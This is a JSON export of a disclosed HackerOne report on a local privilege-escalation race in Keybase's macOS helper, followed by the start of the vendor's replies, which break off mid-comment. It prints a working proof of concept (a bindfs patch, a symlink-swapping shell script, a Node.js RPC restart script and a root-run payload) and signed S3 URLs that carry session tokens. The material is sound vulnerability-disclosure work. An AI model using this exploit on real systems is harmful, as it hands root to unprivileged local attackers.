{"id":470398,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzAzOTg=","url":"https://hackerone.com/reports/470398","title":"Local privilege escalation bug using Keybase redirector on macOS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-12-20T21:33:40.369Z","submitted_at":"2018-12-20T21:33:40.369Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"votava","url":"/votava","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-30T18:15:40.373Z","bug_reporter_agreed_on_going_public_at":"2019-01-30T18:15:40.305Z","team_member_agreed_on_going_public_at":"2019-01-30T18:13:26.802Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There's a local privilege escalation bug in the latest version of Keybase for\nmacOS.\n\nThe issue is in the process of launching `keybase-redirector`. The process works as follows:\n\n1. Copy `keybase-redirector` binary to a root-only location\n2. Check its signature\n3. Launch the binary\n\n[Code ref](https://github.com/keybase/client/blob/37b894b8e2a2b6cf023516900ef2ee9c058ca65f/osx/Helper/KBHelper.m#L213-L236).\n\nNote the following:\n\n1. There's a window between point 2. and 3. When the window is opened, the\n   binary is referenced using just its path.\n2. The `keybase-redirector` can be a symlink pointing to an arbitrary location\n   from the privileged location.\n\nThe goal is to replace the real binary with a symlink which will first point to\nthe real binary (for the signature verification process) and then updated to\npoint to an evil binary/script for the launch.\n\nThe window is tiny and thus reproducing this is a bit tricky. One can do it in\nmany ways but the most complicated (while being the most fragile one at the\nsame time!) is as follows:\n\n### 1. Install Keybase including the Finder integration\n### 2. Build and install bindfs with the following patch:\n\n```\ndiff --git a/src/bindfs.c b/src/bindfs.c\nindex baacb82..b80e396 100644\n--- a/src/bindfs.c\n+++ b/src/bindfs.c\n@@ -1090,6 +1090,7 @@ static int bindfs_open(const char *path, struct fuse_file_info *fi)\n static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n                        struct fuse_file_info *fi)\n {\n+    static int counter = 0;\n     int res;\n     (void) path;\n\n@@ -1101,6 +1102,9 @@ static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n     if (res == -1)\n         res = -errno;\n\n+    printf(\"%i\\n\", counter++);\n+    fflush(stdout);\n+\n     return res;\n }\n```\n\n### 3. Run `doit.sh`.\nIt will first create a few symlinks. This will allow the switch between the original binary and the evil one. It will then force a restart of `keybase-redirector` (by uninstalling it and installing it again). Finally, it will start bindfs, watch out for \"502\" and switch the symlinks.\n\n#### doit.sh\n```\n#!/bin/sh\n\ntest -L /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector || cp /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector ~/exploit/keybase-redirector.orig\n\nmkdir -p ~/switcher\nln -sf ~/switcher/switch /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector\nln -sf ~/switcher/keybase-redirector.orig ~/exploit/switch\n\n(node restart-kbhelper/index.js \u0026\u0026 ls -l /pwned.txt) \u0026\n\nbindfs -f ~/exploit ~/switcher | while read line\ndo\n  [[ $line == \"502\" ]] \u0026\u0026 ln -sf ~/switcher/evil.sh ~/switcher/switch\ndone\n```\n\n#### evil.sh\n```\n#!/bin/sh\n\ntouch /pwned.txt\n```\n\nThe restart is done using the MessagePack RPC using Node.js but you can do it\nin another way, it's just we had this laying around. The number 502 is a\ncount of read requests for the FUSE file system. As you can imagine it's\npretty fragile, but again, we were using bindfs anyway and this worked.\n\n#### restart-kbhelper/index.js\n```js\nconst homedir = require(\"os\").homedir();\nconst rpc = require(\"framed-msgpack-rpc\");\nconst socket = `${homedir}/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock`;\n\nconst x = rpc.createTransport({ path: socket });\nfunction restart() {\n    x.connect(() =\u003e {\n        const c = new rpc.Client(x, \"keybase.1.install\");\n        c.invoke('uninstallKBFS', [{}], () =\u003e {\n            c.invoke('installKBFS', [{}], (err, response) =\u003e {\n                console.log(JSON.stringify(response, 0, 2));\n                x.close();\n            });\n        });\n    });\n}\n\nrestart();\n```\n\n\nA similar but better solution would be to simply write a custom read FUSE hook\nand return a different file once the original is read in the verification\nprocess. But again, the previous quick \u0026 dirty solution worked so why bother.\n\nWe recorded a video showing it in action (attached). Note that this was joint\neffort by Jan Votava (https://twitter.com/elektronek) and Jiri Pospisil (https://twitter.com/jiripospisil) from https://sensible.io.\n\n## Impact\n\nA local user is able to run an arbitrary binary/script with root privileges leading to a total system compromise.","vulnerability_information_html":"\u003cp\u003eThere\u0026#39;s a local privilege escalation bug in the latest version of Keybase for\u003cbr\u003e\nmacOS.\u003c/p\u003e\n\n\u003cp\u003eThe issue is in the process of launching \u003ccode\u003ekeybase-redirector\u003c/code\u003e. The process works as follows:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eCopy \u003ccode\u003ekeybase-redirector\u003c/code\u003e binary to a root-only location\u003c/li\u003e\n\u003cli\u003eCheck its signature\u003c/li\u003e\n\u003cli\u003eLaunch the binary\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2F37b894b8e2a2b6cf023516900ef2ee9c058ca65f%2Fosx%2FHelper%2FKBHelper.m%23L213-L236\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCode ref\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eNote the following:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThere\u0026#39;s a window between point 2. and 3. When the window is opened, the\nbinary is referenced using just its path.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003ekeybase-redirector\u003c/code\u003e can be a symlink pointing to an arbitrary location\nfrom the privileged location.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe goal is to replace the real binary with a symlink which will first point to\u003cbr\u003e\nthe real binary (for the signature verification process) and then updated to\u003cbr\u003e\npoint to an evil binary/script for the launch.\u003c/p\u003e\n\n\u003cp\u003eThe window is tiny and thus reproducing this is a bit tricky. One can do it in\u003cbr\u003e\nmany ways but the most complicated (while being the most fragile one at the\u003cbr\u003e\nsame time!) is as follows:\u003c/p\u003e\n\n\u003ch3 id=\"1-install-keybase-including-the-finder-integration\"\u003e1. Install Keybase including the Finder integration\u003c/h3\u003e\n\n\u003ch3 id=\"2-build-and-install-bindfs-with-the-following-patch\"\u003e2. Build and install bindfs with the following patch:\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/src/bindfs.c b/src/bindfs.c\nindex baacb82..b80e396 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/bindfs.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/bindfs.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1090,6 +1090,7 @@\u003c/span\u003e static int bindfs_open(const char *path, struct fuse_file_info *fi)\n static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n                        struct fuse_file_info *fi)\n {\n\u003cspan class=\"gi\"\u003e+    static int counter = 0;\n\u003c/span\u003e     int res;\n     (void) path;\n\n@@ -1101,6 +1102,9 @@ static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n     if (res == -1)\n         res = -errno;\n\n+    printf(\u0026quot;%i\\n\u0026quot;, counter++);\n\u003cspan class=\"gi\"\u003e+    fflush(stdout);\n+\n\u003c/span\u003e     return res;\n }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"3-run-doit-sh\"\u003e3. Run \u003ccode\u003edoit.sh\u003c/code\u003e.\u003c/h3\u003e\n\n\u003cp\u003eIt will first create a few symlinks. This will allow the switch between the original binary and the evil one. It will then force a restart of \u003ccode\u003ekeybase-redirector\u003c/code\u003e (by uninstalling it and installing it again). Finally, it will start bindfs, watch out for \u0026quot;502\u0026quot; and switch the symlinks.\u003c/p\u003e\n\n\u003ch4 id=\"doit-sh\"\u003edoit.sh\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/sh\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003etest\u003c/span\u003e \u003cspan class=\"nt\"\u003e-L\u003c/span\u003e /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nb\"\u003ecp\u003c/span\u003e /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector ~/exploit/keybase-redirector.orig\n\n\u003cspan class=\"nb\"\u003emkdir\u003c/span\u003e \u003cspan class=\"nt\"\u003e-p\u003c/span\u003e ~/switcher\n\u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-sf\u003c/span\u003e ~/switcher/switch /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector\n\u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-sf\u003c/span\u003e ~/switcher/keybase-redirector.orig ~/exploit/switch\n\n\u003cspan class=\"o\"\u003e(\u003c/span\u003enode restart-kbhelper/index.js \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nb\"\u003els\u003c/span\u003e \u003cspan class=\"nt\"\u003e-l\u003c/span\u003e /pwned.txt\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u0026amp;\n\nbindfs \u003cspan class=\"nt\"\u003e-f\u003c/span\u003e ~/exploit ~/switcher | \u003cspan class=\"k\"\u003ewhile \u003c/span\u003e\u003cspan class=\"nb\"\u003eread \u003c/span\u003eline\n\u003cspan class=\"k\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e[[\u003c/span\u003e \u003cspan class=\"nv\"\u003e$line\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;502\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e]]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-sf\u003c/span\u003e ~/switcher/evil.sh ~/switcher/switch\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"evil-sh\"\u003eevil.sh\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/sh\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003etouch\u003c/span\u003e /pwned.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe restart is done using the MessagePack RPC using Node.js but you can do it\u003cbr\u003e\nin another way, it\u0026#39;s just we had this laying around. The number 502 is a\u003cbr\u003e\ncount of read requests for the FUSE file system. As you can imagine it\u0026#39;s\u003cbr\u003e\npretty fragile, but again, we were using bindfs anyway and this worked.\u003c/p\u003e\n\n\u003ch4 id=\"restart-kbhelper-index-js\"\u003erestart-kbhelper/index.js\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ehomedir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eos\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomedir\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003erpc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eframed-msgpack-rpc\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003esocket\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomedir\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erpc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateTransport\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"na\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003esocket\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erestart\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003erpc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eClient\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ekeybase.1.install\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euninstallKBFS\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[{}],\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einstallKBFS\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[{}],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003erestart\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA similar but better solution would be to simply write a custom read FUSE hook\u003cbr\u003e\nand return a different file once the original is read in the verification\u003cbr\u003e\nprocess. But again, the previous quick \u0026amp; dirty solution worked so why bother.\u003c/p\u003e\n\n\u003cp\u003eWe recorded a video showing it in action (attached). Note that this was joint\u003cbr\u003e\neffort by Jan Votava (\u003ca title=\"https://twitter.com/elektronek\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Felektronek\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/elektronek\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and Jiri Pospisil (\u003ca title=\"https://twitter.com/jiripospisil\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fjiripospisil\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/jiripospisil\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) from \u003ca title=\"https://sensible.io\" href=\"/redirect?url=https%3A%2F%2Fsensible.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sensible.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eA local user is able to run an arbitrary binary/script with root privileges leading to a total system compromise.\u003c/p\u003e\n","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":395276,"file_name":"pwned.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/276/4b5f873f381e73c74edc9c15c06758556ddfc5fc/pwned.mp4?response-content-disposition=attachment%3B%20filename%3D%22pwned.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwned.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060239Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=ce702f7a3cc981130721ba9b200cb8b85f8ce9982845ebb64458bc66256e9836","file_size":4726516,"type":"video/mp4"},{"id":395277,"file_name":"exploit.tar","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/277/e9aa5f5b2b1be5d9aa2b4571b3d8f71ad1ee4eb7/exploit.tar?response-content-disposition=attachment%3B%20filename%3D%22exploit.tar%22%3B%20filename%2A%3DUTF-8%27%27exploit.tar\u0026response-content-type=application%2Fx-tar\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060239Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=a0b2aa352a8471025e99e61f7292fc87620ec3eafbbe02f413d9460b3dbda888","file_size":10240,"type":"application/x-tar"}],"allow_singular_disclosure_at":null,"vote_count":23,"voters":["mirchr","sp1d3rs","dxaxpanda","bl4de","spam404","dhakal_ananda","mygf","protesen","kunal94","khizer47","and 13 more..."],"severity":{"rating":"high","score":7.8,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3873619,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report, we'll look into it ASAP.","markdown_message":"\u003cp\u003eThank you for the report, we\u0026#39;ll look into it ASAP.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-20T23:09:49.416Z","updated_at":"2018-12-20T23:09:49.416Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3873623,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We took a quick glance, if it turns out to be an issue (which we're assuming at this point it is), do you think it's sufficient fix to add a step 1.5 to check that the target isn't a symlink?","markdown_message":"\u003cp\u003eWe took a quick glance, if it turns out to be an issue (which we\u0026#39;re assuming at this point it is), do you think it\u0026#39;s sufficient fix to add a step 1.5 to check that the target isn\u0026#39;t a symlink?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-20T23:11:09.810Z","updated_at":"2018-12-20T23:11:09.810Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3874349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, checking that the file is 